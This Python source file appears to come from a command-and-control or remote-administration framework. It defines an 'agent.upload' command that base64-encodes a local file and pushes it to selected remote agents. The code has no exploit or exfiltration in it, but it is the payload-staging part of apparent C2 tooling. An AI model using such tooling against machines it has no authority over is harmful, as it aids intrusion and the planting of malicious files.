# src/server/commands/agent/file_upload.py

import os
import base64
from pathlib import Path
from config import MessageType as messtype
from ..base import Command
from ..registry import register
from ..interact.shell import ShellManager
from rich import print
from core.client_manager import Manager


def upload_handler(cid, local_file_path, remote_file_path):

    if not os.path.isfile(local_file_path):
        print(f"[!] File not found: {local_file_path}")
        return False

    # Get file size
    file_size = os.path.getsize(local_file_path)
    print(f"[*] Uploading {local_file_path} ({file_size} bytes) to {remote_file_path}")

    client = Manager.get_client(cid)
    if client is None:
        print(f"[!] Client {cid} not found")
        return False


    with open(local_file_path, 'rb') as f:
        file_data = base64.b64encode(f.read()).decode('utf-8')

    client_session = client.session

    client_session.send_request(
        messtype.COMMAND,
        {
            'command': 'agent.upload',
            'file_path': remote_file_path,
            'file_data': file_data,
            'file_size': file_size,
        }
    )
    return True


@register
class FileUpload(Command):
    name = "agent.upload"
    description = "Upload file to agent: file.upload <file_path> <remote_path>"
    group = "agent"
    
    def execute(self, *args):

        if len(args) < 2:
            print(f"[blue_violet][!] Missing arguments provided. Use 'help {self.name}' for usage[/blue_violet]\n")
            return
        
        local_file_path = args[0]
        remote_file_path = args[1]

        current_clients = ShellManager.get_current_client()
        
        if not current_clients:
            print("[!] No agent selected. Use 'client.select <client-id>' first")
            return
        
        # Upload to all selected clients
        for cid in current_clients:
            print(f"[*] Uploading to {cid}...")
            upload_handler(cid, local_file_path, remote_file_path)

    @staticmethod
    def get_help():
        help_detail = f"""
        Description : Upload file to agent
        Usage : agent.upload <local_file_path> <remote_file_path>

        Example : agent.upload /path/file.txt /tmp/file.txt  
        """

        return help_detail